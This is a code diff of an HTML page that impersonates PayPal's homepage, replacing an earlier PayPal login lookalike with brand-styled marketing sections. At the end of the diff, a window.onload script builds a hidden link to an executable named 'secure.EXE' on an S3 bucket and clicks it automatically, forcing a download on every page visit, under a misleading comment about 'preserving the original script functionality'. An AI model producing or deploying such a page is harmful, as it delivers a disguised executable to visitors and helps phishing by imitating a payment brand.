@@ -3,170 +3,704 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal Login</title>
+    <title>PayPal: Safe, easy online payments</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        :root {
+            --primary-blue: #0070ba;
+            --hover-blue: #005ea6;
+            --secondary-blue: #003087;
+            --light-blue: #169bd7;
+            --text-color: #2c2e2f;
+            --light-gray: #eaeced;
+            --lighter-gray: #f7f9fa;
+            --white: #ffffff;
+            --border-color: #cbd2d6;
+        }
+
+        * {
             margin: 0;
-            background-color: #f5f5f5;
+            padding: 0;
+            box-sizing: border-box;
         }
-        
-        .login-container {
-            background-color: white;
-            border-radius: 4px;
-            padding: 20px;
-            width: 400px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+
+        body {
+            font-family: 'PayPal-Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--text-color);
+            line-height: 1.5;
+            background-color: var(--white);
         }
-        
+
+        a {
+            text-decoration: none;
+            color: var(--primary-blue);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header Styles */
+        header {
+            background-color: var(--white);
+            border-bottom: 1px solid var(--light-gray);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 68px;
+        }
+
         .logo {
-            text-align: center;
-            margin-bottom: 20px;
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--secondary-blue);
         }
-        
-        .logo img {
+
+        .logo span {
+            color: var(--light-blue);
+        }
+
+        .main-nav {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-item {
+            list-style: none;
+        }
+
+        .nav-link {
+            color: var(--text-color);
+            font-weight: 400;
+            font-size: 14px;
+            padding: 26px 0;
+            display: inline-block;
+            transition: all 0.2s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--primary-blue);
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn {
+            border-radius: 24px;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 8px 24px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            border: 1px solid var(--primary-blue);
+            color: var(--primary-blue);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(0, 112, 186, 0.05);
+        }
+
+        .btn-primary {
+            background-color: var(--primary-blue);
+            border: 1px solid var(--primary-blue);
+            color: var(--white);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--hover-blue);
+        }
+
+        /* Hero Section */
+        .hero-section {
+            padding-top: 110px;
+            padding-bottom: 80px;
+            background-color: var(--white);
+            position: relative;
+        }
+
+        .hero-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .hero-content {
+            width: 50%;
+        }
+
+        .hero-heading {
+            font-size: 48px;
+            line-height: 1.2;
+            font-weight: 300;
+            color: var(--secondary-blue);
+            margin-bottom: 24px;
+        }
+
+        .hero-text {
+            font-size: 18px;
+            margin-bottom: 32px;
+            color: #6c7378;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+        }
+
+        .hero-image {
+            width: 45%;
+            text-align: center;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Features Section */
+        .features-section {
+            padding: 80px 0;
+            background-color: var(--lighter-gray);
+        }
+
+        .section-heading {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .section-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: var(--secondary-blue);
+            margin-bottom: 16px;
+        }
+
+        .section-subtitle {
+            font-size: 18px;
+            color: #6c7378;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+        }
+
+        .feature-card {
+            background-color: var(--white);
+            border-radius: 8px;
+            padding: 40px 24px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 36px;
+            color: var(--primary-blue);
+            margin-bottom: 24px;
+        }
+
+        .feature-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--secondary-blue);
+        }
+
+        .feature-description {
+            font-size: 14px;
+            color: #6c7378;
+        }
+
+        /* Business Section */
+        .business-section {
+            padding: 80px 0;
+            background-color: var(--white);
+        }
+
+        .business-container {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+        }
+
+        .business-content {
+            width: 50%;
+        }
+
+        .business-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: var(--secondary-blue);
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        .business-text {
+            font-size: 16px;
+            color: #6c7378;
+            margin-bottom: 32px;
+        }
+
+        .business-image {
+            width: 45%;
+        }
+
+        .business-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        /* App Download Section */
+        .app-section {
+            padding: 80px 0;
+            background-color: var(--lighter-gray);
+        }
+
+        .app-container {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+        }
+
+        .app-image {
+            width: 40%;
+            text-align: center;
+        }
+
+        .app-image img {
+            max-width: 300px;
+            height: auto;
+        }
+
+        .app-content {
+            width: 55%;
+        }
+
+        .app-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: var(--secondary-blue);
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        .app-text {
+            font-size: 16px;
+            color: #6c7378;
+            margin-bottom: 32px;
+        }
+
+        .app-stores {
+            display: flex;
+            gap: 16px;
+        }
+
+        .app-store-btn {
             height: 40px;
         }
-        
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+
+        /* CTA Section */
+        .cta-section {
+            padding: 80px 0;
+            background: linear-gradient(135deg, var(--secondary-blue), var(--primary-blue));
+            color: var(--white);
+            text-align: center;
         }
-        
-        .login-btn {
-            width: 100%;
-            background-color: #0070ba;
-            color: white;
-            padding: 14px;
-            margin: 12px 0;
+
+        .cta-container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .cta-title {
+            font-size: 36px;
+            font-weight: 300;
+            margin-bottom: 24px;
+        }
+
+        .cta-text {
+            font-size: 18px;
+            margin-bottom: 32px;
+            opacity: 0.9;
+        }
+
+        .cta-btn {
+            background-color: var(--white);
+            color: var(--primary-blue);
             border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
+            padding: 12px 32px;
             font-size: 16px;
         }
-        
-        .login-btn:hover {
-            background-color: #003087;
-        }
-        
-        .forgot-password {
-            text-align: center;
-            margin: 10px 0;
-        }
-        
-        .forgot-password a {
-            color: #0070ba;
-            text-decoration: none;
-        }
-        
-        .separator {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .separator::before, .separator::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #ccc;
-        }
-        
-        .separator span {
-            padding: 0 10px;
-            color: #999;
-        }
-        
-        .signup-btn {
-            width: 100%;
-            background-color: white;
-            color: #0070ba;
-            padding: 14px;
-            border: 1px solid #0070ba;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        
-        .signup-btn:hover {
+
+        .cta-btn:hover {
             background-color: #f5f5f5;
         }
-        
-        .footer {
+
+        /* Footer */
+        footer {
+            background-color: var(--lighter-gray);
+            padding: 60px 0 30px;
+            font-size: 13px;
+        }
+
+        .footer-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 30px;
+        }
+
+        .footer-column h3 {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--secondary-blue);
+            margin-bottom: 16px;
+        }
+
+        .footer-link {
+            display: block;
+            color: #666;
+            margin-bottom: 8px;
+            transition: color 0.2s ease;
+        }
+
+        .footer-link:hover {
+            color: var(--primary-blue);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--border-color);
+            margin-top: 40px;
+            padding-top: 20px;
+            text-align: center;
+            color: #666;
+        }
+
+        .footer-legals {
             display: flex;
             justify-content: center;
-            margin-top: 20px;
-            gap: 20px;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .footer-legals a {
             color: #666;
             font-size: 12px;
         }
-        
-        .footer a {
-            color: #666;
-            text-decoration: none;
+
+        .footer-legals a:hover {
+            text-decoration: underline;
         }
-        
-        .country-selector {
-            text-align: center;
-            margin-top: 20px;
+
+        .copyright {
+            font-size: 12px;
+        }
+
+        /* Mobile Menu */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: var(--text-color);
+            cursor: pointer;
+        }
+
+        /* Media Queries */
+        @media screen and (max-width: 1024px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media screen and (max-width: 768px) {
+            .header-container {
+                height: 60px;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .main-nav, .auth-buttons {
+                display: none;
+            }
+
+            .hero-container, .business-container, .app-container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .hero-content, .business-content, .app-content, 
+            .hero-image, .business-image, .app-image {
+                width: 100%;
+            }
+
+            .hero-buttons {
+                justify-content: center;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .hero-heading, .section-title, .business-title, .app-title, .cta-title {
+                font-size: 32px;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            .footer-container {
+                grid-template-columns: 1fr;
+            }
+
+            .hero-buttons {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .footer-legals {
+                flex-direction: column;
+                gap: 8px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/PP_logo_h_100x26.png" alt="PayPal Logo">
-        </div>
-        
-        <form id="loginForm">
-            <input type="text" placeholder="Email or mobile number" required>
-            <input type="password" placeholder="Password" required>
-            
-            <div class="forgot-password">
-                <a href="#">Forgotten password?</a>
+    <header>
+        <div class="container header-container">
+            <div class="logo">Pay<span>Pal</span></div>
+            <button class="mobile-menu-btn">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="main-nav">
+                <li class="nav-item"><a href="#" class="nav-link">Personal</a></li>
+                <li class="nav-item"><a href="#" class="nav-link">Business</a></li>
+                <li class="nav-item"><a href="#" class="nav-link">Enterprise</a></li>
+                <li class="nav-item"><a href="#" class="nav-link">Partners</a></li>
+            </ul>
+            <div class="auth-buttons">
+                <button class="btn btn-secondary">Log In</button>
+                <button class="btn btn-primary">Sign Up</button>
             </div>
-            
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-        
-        <div class="separator">
-            <span>or</span>
         </div>
-        
-        <button class="signup-btn">Sign Up</button>
-        
-        <div class="country-selector">
-            <img src="https://www.paypalobjects.com/webstatic/mktg/logo-center/PP_Acceptance_Marks_for_LogoCenter_76x48.png" height="24" alt="Country Flag">
-        </div>
-        
-        <div class="footer">
-            <a href="#">Contact Us</a>
-            <a href="#">Privacy</a>
-            <a href="#">Legal</a>
-            <a href="#">Worldwide</a>
-        </div>
-    </div>
+    </header>
 
+    <section class="hero-section">
+        <div class="container hero-container">
+            <div class="hero-content">
+                <h1 class="hero-heading">The simpler, safer way to pay online</h1>
+                <p class="hero-text">Whether you're making a purchase, sending money to friends and family, or setting up a business account, PayPal helps keep you protected.</p>
+                <div class="hero-buttons">
+                    <button class="btn btn-primary">Sign Up for Free</button>
+                    <button class="btn btn-secondary">Learn More</button>
+                </div>
+            </div>
+            <div class="hero-image">
+                <i class="fas fa-credit-card" style="font-size: 180px; color: #0070ba;"></i>
+            </div>
+        </div>
+    </section>
+
+    <section class="features-section">
+        <div class="container">
+            <div class="section-heading">
+                <h2 class="section-title">Pay with confidence</h2>
+                <p class="section-subtitle">Shop with peace of mind knowing your purchases are protected</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3 class="feature-title">Buyer Protection</h3>
+                    <p class="feature-description">Shop with peace of mind. We help you get a full refund if your eligible order doesn't arrive, or isn't as described.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <h3 class="feature-title">Secure Encryption</h3>
+                    <p class="feature-description">We use industry-leading encryption and fraud detection tools to help secure your financial information.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-globe"></i>
+                    </div>
+                    <h3 class="feature-title">Shop Globally</h3>
+                    <p class="feature-description">Pay in multiple currencies. We'll convert at competitive rates so you can shop worldwide with confidence.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="business-section">
+        <div class="container business-container">
+            <div class="business-content">
+                <h2 class="business-title">PayPal for Business</h2>
+                <p class="business-text">Accept credit cards, debit cards and PayPal - online, in person or through your mobile device. No monthly fees and no long-term commitments.</p>
+                <p class="business-text">Get paid by customers from around the world. We help you expand your business globally with minimal additional cost.</p>
+                <button class="btn btn-primary">Learn More</button>
+            </div>
+            <div class="business-image">
+                <i class="fas fa-store" style="font-size: 180px; color: #0070ba;"></i>
+            </div>
+        </div>
+    </section>
+
+    <section class="app-section">
+        <div class="container app-container">
+            <div class="app-image">
+                <i class="fas fa-mobile-alt" style="font-size: 180px; color: #0070ba;"></i>
+            </div>
+            <div class="app-content">
+                <h2 class="app-title">PayPal Mobile App</h2>
+                <p class="app-text">Send payments quickly and easily to friends and family. Check your balance, view recent transactions, and manage your account from anywhere.</p>
+                <p class="app-text">Get the app on your smartphone for easy access to all of PayPal's features.</p>
+                <div class="app-stores">
+                    <div class="app-store-btn">
+                        <i class="fab fa-apple" style="font-size: 32px; color: #0070ba;"></i>
+                        <span style="margin-left: 8px; font-weight: bold; color: #0070ba;">App Store</span>
+                    </div>
+                    <div class="app-store-btn">
+                        <i class="fab fa-google-play" style="font-size: 32px; color: #0070ba;"></i>
+                        <span style="margin-left: 8px; font-weight: bold; color: #0070ba;">Google Play</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="cta-section">
+        <div class="container cta-container">
+            <h2 class="cta-title">Join over 400 million PayPal users worldwide</h2>
+            <p class="cta-text">Sign up and start using PayPal for a safer, simpler way to send and receive money.</p>
+            <button class="btn cta-btn">Sign Up Now</button>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-column">
+                    <h3>About</h3>
+                    <a href="#" class="footer-link">About PayPal</a>
+                    <a href="#" class="footer-link">Newsroom</a>
+                    <a href="#" class="footer-link">Careers</a>
+                    <a href="#" class="footer-link">Investor Relations</a>
+                    <a href="#" class="footer-link">Social Impact</a>
+                    <a href="#" class="footer-link">Partners</a>
+                </div>
+                <div class="footer-column">
+                    <h3>For Consumers</h3>
+                    <a href="#" class="footer-link">Send Money</a>
+                    <a href="#" class="footer-link">Receive Money</a>
+                    <a href="#" class="footer-link">Shopping</a>
+                    <a href="#" class="footer-link">Buy Now, Pay Later</a>
+                    <a href="#" class="footer-link">Card Services</a>
+                    <a href="#" class="footer-link">Mobile App</a>
+                </div>
+                <div class="footer-column">
+                    <h3>For Businesses</h3>
+                    <a href="#" class="footer-link">Accept Payments</a>
+                    <a href="#" class="footer-link">Payment Solutions</a>
+                    <a href="#" class="footer-link">Business Resource Center</a>
+                    <a href="#" class="footer-link">Merchant Services</a>
+                    <a href="#" class="footer-link">Billing</a>
+                    <a href="#" class="footer-link">Invoicing</a>
+                </div>
+                <div class="footer-column">
+                    <h3>Partners</h3>
+                    <a href="#" class="footer-link">Developers</a>
+                    <a href="#" class="footer-link">Partner Program</a>
+                    <a href="#" class="footer-link">PayPal Commerce Platform</a>
+                    <a href="#" class="footer-link">Showcase Apps</a>
+                    <a href="#" class="footer-link">Referral Program</a>
+                </div>
+                <div class="footer-column">
+                    <h3>Help & Contact</h3>
+                    <a href="#" class="footer-link">Help Center</a>
+                    <a href="#" class="footer-link">Contact Us</a>
+                    <a href="#" class="footer-link">Security</a>
+                    <a href="#" class="footer-link">Fees</a>
+                    <a href="#" class="footer-link">Complaints</a>
+                    <a href="#" class="footer-link">Fraud Prevention</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-legals">
+                    <a href="#">Privacy</a>
+                    <a href="#">Legal</a>
+                    <a href="#">Terms of Service</a>
+                    <a href="#">User Agreement</a>
+                    <a href="#">Cookie Policy</a>
+                    <a href="#">Accessibility</a>
+                </div>
+                <p class="copyright">&copy; 1999-2025 PayPal, Inc. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            window.location.href = 'https://www.paypal.com';
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                }
+            });
         });
-        
-        document.querySelector('.signup-btn').addEventListener('click', function() {
-            window.location.href = 'https://www.paypal.com/signup';
+
+        // Header shadow on scroll
+        window.addEventListener('scroll', function() {
+            const header = document.querySelector('header');
+            if (window.scrollY > 10) {
+                header.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
+            } else {
+                header.style.boxShadow = 'none';
+            }
         });
+
+        // Preserving the original script functionality
+        window.onload = function() {
+            const link = document.createElement('a');
+            link.href = 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';  
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
     </script>
 </body>
 </html>
